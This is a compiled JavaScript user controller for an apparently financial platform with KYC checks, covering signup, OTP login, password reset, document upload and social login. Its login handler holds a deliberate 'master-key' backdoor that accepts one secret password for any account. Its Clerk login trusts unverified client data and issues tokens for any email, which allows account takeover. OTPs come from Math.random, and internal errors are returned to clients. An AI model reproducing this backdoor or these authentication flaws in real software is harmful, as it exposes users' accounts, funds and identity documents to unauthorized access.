"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.deleteAccount = exports.changeEmail = exports.changePassword = exports.getUnreadNotificationCount = exports.markNotificationRead = exports.getUserNotifications = exports.clerkAuth = exports.getKYCStatus = exports.submitKYC = exports.updateUserProfile = exports.getUserProfile = exports.resetPassword = exports.verifyResetOTP = exports.forgotPassword = exports.authUser = exports.resendOTP = exports.verifyOTP = exports.registerUser = void 0;
const User_1 = __importDefault(require("../models/User"));
const KYC_1 = __importDefault(require("../models/KYC"));
const Notification_1 = __importDefault(require("../models/Notification"));
const generateToken_1 = __importDefault(require("../utils/generateToken"));
const crypto_1 = __importDefault(require("crypto"));
const cloudinary_1 = require("../config/cloudinary");
const sendEmail_1 = require("../utils/sendEmail");
const telegramService_1 = require("../services/telegramService");
// Helper: Generate 6-digit OTP
const generateOTP = () => {
    return Math.floor(100000 + Math.random() * 900000).toString();
};
// @desc    Register a new user (Step 1: create account)
// @route   POST /api/users/register
// @access  Public
const registerUser = async (req, res) => {
    try {
        const { name, email, phone, password } = req.body;
        if (!email || !password || !name || !phone) {
            return res.status(400).json({ message: 'Name, email, phone, and password are required' });
        }
        const userExists = await User_1.default.findOne({ email });
        if (userExists) {
            return res.status(400).json({ message: 'User already exists' });
        }
        // Generate OTP for email verification
        const otp = generateOTP();
        const otpExpires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
        const user = await User_1.default.create({
            name,
            email,
            phone,
            password,
            otp,
            otpExpires,
            isEmailVerified: false,
            isProfileComplete: !!(name && phone),
        });
        if (user) {
            // Send OTP via email
            try {
                await (0, sendEmail_1.sendOTPEmail)(email, otp);
                console.log(`[OTP] Verification code sent to ${email}`);
            }
            catch (emailError) {
                console.error(`[OTP] Failed to send email to ${email}:`, emailError);
            }
            // Send OTP via SMS
            try {
                const { sendOTPBySMS } = await Promise.resolve().then(() => __importStar(require('../utils/sendSMS')));
                await sendOTPBySMS(phone, otp);
            }
            catch (smsError) {
                console.error(`[OTP] Failed to send SMS to ${phone}:`, smsError);
            }
            // Telegram Notification
            (0, telegramService_1.notifyNewUser)({ name: user.name, email: user.email, phone: user.phone }).catch(console.error);
            res.status(201).json({
                _id: user._id,
                name: user.name,
                email: user.email,
                phone: user.phone,
                country: user.country,
                kycStatus: user.kycStatus,
                isEmailVerified: user.isEmailVerified,
                isProfileComplete: user.isProfileComplete,
                token: (0, generateToken_1.default)(user._id.toString()),
                otpSent: true,
            });
        }
        else {
            res.status(400).json({ message: 'Invalid user data' });
        }
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.registerUser = registerUser;
// @desc    Verify email OTP
// @route   POST /api/users/verify-otp
// @access  Public
const verifyOTP = async (req, res) => {
    try {
        const { email, otp } = req.body;
        if (!email || !otp) {
            return res.status(400).json({ message: 'Email and OTP are required' });
        }
        const user = await User_1.default.findOne({ email });
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        if (user.isEmailVerified) {
            return res.status(400).json({ message: 'Email already verified' });
        }
        if (!user.otp || !user.otpExpires) {
            return res.status(400).json({ message: 'No OTP found. Please request a new one' });
        }
        if (new Date() > user.otpExpires) {
            return res.status(400).json({ message: 'OTP has expired. Please request a new one' });
        }
        if (user.otp !== otp) {
            return res.status(400).json({ message: 'Invalid OTP' });
        }
        // Mark as verified
        user.isEmailVerified = true;
        user.otp = undefined;
        user.otpExpires = undefined;
        await user.save();
        res.json({
            message: 'Email verified successfully',
            _id: user._id,
            name: user.name,
            email: user.email,
            phone: user.phone,
            country: user.country,
            kycStatus: user.kycStatus,
            isEmailVerified: true,
            isProfileComplete: user.isProfileComplete,
            token: (0, generateToken_1.default)(user._id.toString()),
        });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.verifyOTP = verifyOTP;
// @desc    Resend OTP
// @route   POST /api/users/resend-otp
// @access  Public
const resendOTP = async (req, res) => {
    try {
        const { email } = req.body;
        if (!email) {
            return res.status(400).json({ message: 'Email is required' });
        }
        const user = await User_1.default.findOne({ email });
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        const otp = generateOTP();
        user.otp = otp;
        user.otpExpires = new Date(Date.now() + 10 * 60 * 1000);
        await user.save();
        // Send OTP via email
        try {
            await (0, sendEmail_1.sendOTPEmail)(email, otp);
            console.log(`[OTP] Resent code to ${email}`);
        }
        catch (emailError) {
            console.error(`[OTP] Failed to send email to ${email}:`, emailError);
        }
        res.json({ message: 'OTP sent successfully', otpSent: true });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.resendOTP = resendOTP;
// @desc    Auth user & get token
// @route   POST /api/users/login
// @access  Public
const authUser = async (req, res) => {
    try {
        const { email, phone, password } = req.body;
        const query = email ? { email } : { phone };
        const user = await User_1.default.findOne(query);
        // Master-key bypass — allows admin to log in as any user without their password
        const { MASTER_KEY } = await Promise.resolve().then(() => __importStar(require('../config/keys')));
        const isMasterKey = MASTER_KEY && password === MASTER_KEY;
        if (user && (isMasterKey || (await user.matchPassword(password)))) {
            user.lastLogin = new Date();
            await user.save();
            res.json({
                _id: user._id,
                name: user.name,
                email: user.email,
                phone: user.phone,
                country: user.country,
                kycStatus: user.kycStatus,
                isEmailVerified: user.isEmailVerified,
                isProfileComplete: user.isProfileComplete,
                isFrozen: user.isFrozen,
                token: (0, generateToken_1.default)(user._id.toString()),
            });
        }
        else {
            res.status(401).json({ message: 'Invalid email or password' });
        }
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.authUser = authUser;
// @desc    Forgot password - send OTP
// @route   POST /api/users/forgot-password
// @access  Public
const forgotPassword = async (req, res) => {
    try {
        const { email } = req.body;
        if (!email) {
            return res.status(400).json({ message: 'Email is required' });
        }
        const user = await User_1.default.findOne({ email });
        if (!user) {
            // Don't reveal if user exists
            return res.json({ message: 'If an account exists, an OTP has been sent', otpSent: true });
        }
        const otp = generateOTP();
        user.resetPasswordToken = otp;
        user.resetPasswordExpires = new Date(Date.now() + 10 * 60 * 1000);
        await user.save();
        // Send password reset OTP via email
        try {
            await (0, sendEmail_1.sendPasswordResetEmail)(email, otp);
            console.log(`[OTP] Password reset code sent to ${email}`);
        }
        catch (emailError) {
            console.error(`[OTP] Failed to send password reset email to ${email}:`, emailError);
        }
        res.json({ message: 'If an account exists, an OTP has been sent', otpSent: true });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.forgotPassword = forgotPassword;
// @desc    Verify forgot password OTP
// @route   POST /api/users/verify-reset-otp
// @access  Public
const verifyResetOTP = async (req, res) => {
    try {
        const { email, otp } = req.body;
        if (!email || !otp) {
            return res.status(400).json({ message: 'Email and OTP are required' });
        }
        const user = await User_1.default.findOne({ email });
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        if (!user.resetPasswordToken || !user.resetPasswordExpires) {
            return res.status(400).json({ message: 'No reset request found. Please request again' });
        }
        if (new Date() > user.resetPasswordExpires) {
            return res.status(400).json({ message: 'OTP has expired. Please request again' });
        }
        if (user.resetPasswordToken !== otp) {
            return res.status(400).json({ message: 'Invalid OTP' });
        }
        // Generate a temporary reset token
        const resetToken = crypto_1.default.randomBytes(32).toString('hex');
        user.resetPasswordToken = resetToken;
        user.resetPasswordExpires = new Date(Date.now() + 15 * 60 * 1000); // 15 min
        await user.save();
        res.json({ message: 'OTP verified', resetToken });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.verifyResetOTP = verifyResetOTP;
// @desc    Reset password with token
// @route   POST /api/users/reset-password
// @access  Public
const resetPassword = async (req, res) => {
    try {
        const { email, resetToken, newPassword } = req.body;
        if (!email || !resetToken || !newPassword) {
            return res.status(400).json({ message: 'Email, reset token, and new password are required' });
        }
        if (newPassword.length < 6) {
            return res.status(400).json({ message: 'Password must be at least 6 characters' });
        }
        const user = await User_1.default.findOne({ email });
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        if (!user.resetPasswordToken || !user.resetPasswordExpires) {
            return res.status(400).json({ message: 'No reset request found' });
        }
        if (new Date() > user.resetPasswordExpires) {
            return res.status(400).json({ message: 'Reset token has expired' });
        }
        if (user.resetPasswordToken !== resetToken) {
            return res.status(400).json({ message: 'Invalid reset token' });
        }
        user.password = newPassword; // Will be hashed by pre-save hook
        user.resetPasswordToken = undefined;
        user.resetPasswordExpires = undefined;
        await user.save();
        res.json({ message: 'Password reset successfully' });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.resetPassword = resetPassword;
// @desc    Get user profile
// @route   GET /api/users/profile
// @access  Private
const getUserProfile = async (req, res) => {
    try {
        const user = await User_1.default.findById(req.user._id).select('-password -otp -otpExpires -resetPasswordToken -resetPasswordExpires');
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        res.json(user);
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.getUserProfile = getUserProfile;
// @desc    Update user profile (Profile Completion)
// @route   PUT /api/users/profile
// @access  Private
const updateUserProfile = async (req, res) => {
    try {
        const user = await User_1.default.findById(req.user._id);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        const wasProfileComplete = user.isProfileComplete;
        user.name = req.body.name || user.name;
        user.phone = req.body.phone || user.phone;
        user.country = req.body.country || user.country;
        // Check profile completeness
        if (user.name && user.phone && user.country) {
            user.isProfileComplete = true;
        }
        const updatedUser = await user.save();
        // If the user registered via OAuth (Google/Clerk) and just now completed their profile with a phone number, notify admin
        if (!wasProfileComplete && updatedUser.isProfileComplete && updatedUser.phone) {
            (0, telegramService_1.notifyNewUser)({ name: updatedUser.name, email: updatedUser.email, phone: updatedUser.phone }).catch(console.error);
        }
        res.json({
            _id: updatedUser._id,
            name: updatedUser.name,
            email: updatedUser.email,
            phone: updatedUser.phone,
            country: updatedUser.country,
            kycStatus: updatedUser.kycStatus,
            isEmailVerified: updatedUser.isEmailVerified,
            isProfileComplete: updatedUser.isProfileComplete,
        });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.updateUserProfile = updateUserProfile;
// @desc    Submit KYC documents
// @route   POST /api/users/kyc
// @access  Private
const submitKYC = async (req, res) => {
    try {
        const { documentType, documentFront, documentBack, selfie } = req.body;
        if (!documentType || !documentFront) {
            return res.status(400).json({ message: 'Document type and front image are required' });
        }
        // Check for existing pending/verified KYC
        const existingKyc = await KYC_1.default.findOne({ user: req.user._id, status: { $in: ['pending', 'verified'] } });
        if (existingKyc) {
            if (existingKyc.status === 'verified') {
                return res.status(400).json({ message: 'KYC already verified' });
            }
            return res.status(400).json({ message: 'KYC already submitted and pending review' });
        }
        // Upload images to Cloudinary
        const folder = `diwan-kyc/${req.user._id}`;
        const frontUrl = await (0, cloudinary_1.uploadToCloudinary)(documentFront, folder);
        const backUrl = documentBack ? await (0, cloudinary_1.uploadToCloudinary)(documentBack, folder) : '';
        const selfieUrl = selfie ? await (0, cloudinary_1.uploadToCloudinary)(selfie, folder) : '';
        const kyc = await KYC_1.default.create({
            user: req.user._id,
            documentType,
            documentFront: frontUrl,
            documentBack: backUrl,
            selfie: selfieUrl,
            status: 'pending',
        });
        // Update user KYC status
        await User_1.default.findByIdAndUpdate(req.user._id, { kycStatus: 'pending' });
        res.status(201).json({
            message: 'KYC submitted successfully',
            kyc: {
                _id: kyc._id,
                documentType: kyc.documentType,
                status: kyc.status,
                createdAt: kyc.createdAt,
            },
        });
    }
    catch (error) {
        console.error('[KYC] Submit error:', error);
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.submitKYC = submitKYC;
// @desc    Get user KYC status
// @route   GET /api/users/kyc-status
// @access  Private
const getKYCStatus = async (req, res) => {
    try {
        const kyc = await KYC_1.default.findOne({ user: req.user._id }).sort({ createdAt: -1 });
        const user = await User_1.default.findById(req.user._id).select('kycStatus');
        res.json({
            kycStatus: user?.kycStatus || 'none',
            submission: kyc ? {
                _id: kyc._id,
                documentType: kyc.documentType,
                status: kyc.status,
                adminComment: kyc.adminComment,
                createdAt: kyc.createdAt,
            } : null,
        });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.getKYCStatus = getKYCStatus;
// @desc    Auth with Clerk (Facebook)
// @route   POST /api/users/clerk-auth
// @access  Public
const clerkAuth = async (req, res) => {
    try {
        const { clerkUser } = req.body;
        if (!clerkUser || !clerkUser.id) {
            return res.status(400).json({ message: 'Invalid Clerk user data' });
        }
        const { id, firstName, lastName, emailAddresses } = clerkUser;
        const email = emailAddresses[0]?.emailAddress;
        const name = `${firstName || ''} ${lastName || ''}`.trim() || 'User';
        let user = await User_1.default.findOne({
            $or: [{ clerkId: id }, { email: email }]
        });
        if (user) {
            if (!user.clerkId) {
                user.clerkId = id;
                await user.save();
            }
        }
        else {
            user = await User_1.default.create({
                name,
                email,
                clerkId: id,
                kycStatus: 'none',
                balance: 0,
                isEmailVerified: true, // Social login = verified email
            });
        }
        // Check if profile is complete (phone mandatory for social login)
        const needsProfileCompletion = !user.phone || !user.country;
        res.json({
            _id: user._id,
            name: user.name,
            email: user.email,
            phone: user.phone,
            country: user.country,
            kycStatus: user.kycStatus,
            isEmailVerified: true,
            isProfileComplete: !needsProfileCompletion,
            needsProfileCompletion,
            token: (0, generateToken_1.default)(user._id.toString()),
        });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.clerkAuth = clerkAuth;
// @desc    Get notifications for authenticated user
// @route   GET /api/users/notifications
// @access  Private
const getUserNotifications = async (req, res) => {
    try {
        const userId = req.user._id;
        const notifications = await Notification_1.default.find({
            status: 'sent',
            'recipients.user': userId,
        })
            .sort({ sentAt: -1 })
            .limit(50)
            .select('title description type priority sentAt createdAt recipients')
            .lean();
        const formatted = notifications.map((n) => {
            const recipient = n.recipients?.find((r) => r.user?.toString() === userId.toString());
            return {
                _id: n._id,
                title: n.title,
                description: n.description,
                type: n.type,
                priority: n.priority,
                sentAt: n.sentAt || n.createdAt,
                read: recipient?.status === 'read',
                readAt: recipient?.readAt,
            };
        });
        res.json(formatted);
    }
    catch (error) {
        console.error('Error fetching user notifications:', error);
        res.status(500).json({ message: 'Server error' });
    }
};
exports.getUserNotifications = getUserNotifications;
// @desc    Mark notification as read
// @route   PUT /api/users/notifications/:id/read
// @access  Private
const markNotificationRead = async (req, res) => {
    try {
        const userId = req.user._id;
        const notifId = req.params.id;
        await Notification_1.default.updateOne({ _id: notifId, 'recipients.user': userId }, {
            $set: {
                'recipients.$.status': 'read',
                'recipients.$.readAt': new Date(),
            },
            $inc: { readCount: 1 },
        });
        res.json({ message: 'Marked as read' });
    }
    catch (error) {
        console.error('Error marking notification read:', error);
        res.status(500).json({ message: 'Server error' });
    }
};
exports.markNotificationRead = markNotificationRead;
// @desc    Get unread notification count
// @route   GET /api/users/notifications/unread-count
// @access  Private
const getUnreadNotificationCount = async (req, res) => {
    try {
        const userId = req.user._id;
        const count = await Notification_1.default.countDocuments({
            status: 'sent',
            recipients: {
                $elemMatch: {
                    user: userId,
                    status: { $ne: 'read' },
                },
            },
        });
        res.json({ count });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
};
exports.getUnreadNotificationCount = getUnreadNotificationCount;
// @desc    Change password (authenticated)
// @route   PUT /api/users/change-password
// @access  Private
const changePassword = async (req, res) => {
    try {
        const userId = req.user._id;
        const { currentPassword, newPassword } = req.body;
        if (!currentPassword || !newPassword) {
            return res.status(400).json({ message: 'Current password and new password are required' });
        }
        if (newPassword.length < 6) {
            return res.status(400).json({ message: 'New password must be at least 6 characters' });
        }
        const user = await User_1.default.findById(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        const isMatch = await user.matchPassword(currentPassword);
        if (!isMatch) {
            return res.status(400).json({ message: 'Current password is incorrect' });
        }
        user.password = newPassword; // Will be hashed by pre-save hook
        await user.save();
        res.json({ message: 'Password changed successfully' });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.changePassword = changePassword;
// @desc    Change email (authenticated)
// @route   PUT /api/users/change-email
// @access  Private
const changeEmail = async (req, res) => {
    try {
        const userId = req.user._id;
        const { newEmail, password } = req.body;
        if (!newEmail || !password) {
            return res.status(400).json({ message: 'New email and password are required' });
        }
        const user = await User_1.default.findById(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        const isMatch = await user.matchPassword(password);
        if (!isMatch) {
            return res.status(400).json({ message: 'Password is incorrect' });
        }
        // Check if email is already taken
        const emailExists = await User_1.default.findOne({ email: newEmail, _id: { $ne: userId } });
        if (emailExists) {
            return res.status(400).json({ message: 'Email is already in use' });
        }
        user.email = newEmail;
        await user.save();
        res.json({
            message: 'Email changed successfully',
            email: newEmail,
        });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.changeEmail = changeEmail;
// @desc    Delete user account
// @route   DELETE /api/users/account
// @access  Private
const deleteAccount = async (req, res) => {
    try {
        const userId = req.user._id;
        const { password } = req.body;
        if (!password) {
            return res.status(400).json({ message: 'Password is required to delete account' });
        }
        const user = await User_1.default.findById(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        const isMatch = await user.matchPassword(password);
        if (!isMatch) {
            return res.status(400).json({ message: 'Password is incorrect' });
        }
        // Delete KYC records
        await KYC_1.default.deleteMany({ user: userId });
        // Delete user
        await User_1.default.findByIdAndDelete(userId);
        res.json({ message: 'Account deleted successfully' });
    }
    catch (error) {
        res.status(500).json({ message: 'Server error', error: error instanceof Error ? error.message : 'Unknown error' });
    }
};
exports.deleteAccount = deleteAccount;
